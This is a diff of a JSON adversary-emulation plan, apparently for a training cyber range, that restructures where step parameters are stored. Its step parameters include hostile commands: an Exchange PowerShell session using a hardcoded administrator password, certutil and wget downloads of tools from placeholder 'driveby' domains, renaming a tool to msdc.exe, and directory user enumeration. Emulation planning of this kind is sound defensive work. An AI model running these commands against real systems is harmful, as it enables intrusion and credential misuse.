@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "netbugc.exe",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Interfaces3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -88,7 +96,8 @@
             "label": "DNS3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -98,7 +107,8 @@
                 "payload": "AdFind.exe",
                 "driveby": "self.driveby3",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -106,7 +116,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -117,7 +128,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -128,7 +140,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -139,7 +152,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Collection",
@@ -148,10 +162,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "user_mailbox": "self.target_1_username"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "user_mailbox": "self.target_1_username"
             }
         },
         {
@@ -161,10 +175,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('administrator@site', $password); $mailserver = [Net.DNS]::GetHostByAddress([Net.DNS]::GetHostEntry('Autodiscover').AddressList[0]).Hostname; echo $mailserver; $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$mailserver/PowerShell/ -Authentication Kerberos -Credential $Credential; echo $Session; Import-PSSession $Session -DisableNameChecking -AllowClobber; Get-WebServicesVirtualDirectory; echo ' ';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('administrator@site', $password); $mailserver = [Net.DNS]::GetHostByAddress([Net.DNS]::GetHostEntry('Autodiscover').AddressList[0]).Hostname; echo $mailserver; $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$mailserver/PowerShell/ -Authentication Kerberos -Credential $Credential; echo $Session; Import-PSSession $Session -DisableNameChecking -AllowClobber; Get-WebServicesVirtualDirectory; echo ' ';}"
             }
         },
         {
@@ -175,7 +189,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Discovery",
@@ -185,7 +200,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "DefenseEvasion",
@@ -195,7 +211,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -204,10 +221,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2}${self.temp_dir_name}\\${self.tool_name2}&& echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2}${self.temp_dir_name}\\${self.tool_name2}&& echo \" \""
             }
         },
         {
@@ -217,13 +234,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "original_dir": "self.temp_dir_name",
-                    "original_file": "self.tool_name2",
-                    "destination_dir": "self.temp_dir_name",
-                    "destination_file": "msdc.exe"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "original_dir": "self.temp_dir_name",
+                "original_file": "self.tool_name2",
+                "destination_dir": "self.temp_dir_name",
+                "destination_file": "msdc.exe"
             }
         },
         {
@@ -233,11 +250,11 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "directory": "self.temp_dir_name",
-                    "file_name": "msdc.exe"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "directory": "self.temp_dir_name",
+                "file_name": "msdc.exe"
             }
         },
         {
@@ -247,10 +264,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{wget -O${self.temp_dir_name}\\${self.tool_name3}http://${self.driveby_domain3}/${self.tool_name3}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{wget -O${self.temp_dir_name}\\${self.tool_name3}http://${self.driveby_domain3}/${self.tool_name3}; echo \" \"}"
             }
         },
         {
@@ -260,10 +277,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "windowsshell${self.temp_dir_name}\\${self.tool_name3}-default -f \"objectcategory=user\" \"cn\"; echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "windowsshell${self.temp_dir_name}\\${self.tool_name3}-default -f \"objectcategory=user\" \"cn\"; echo \" \""
             }
         },
         {
@@ -274,7 +291,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
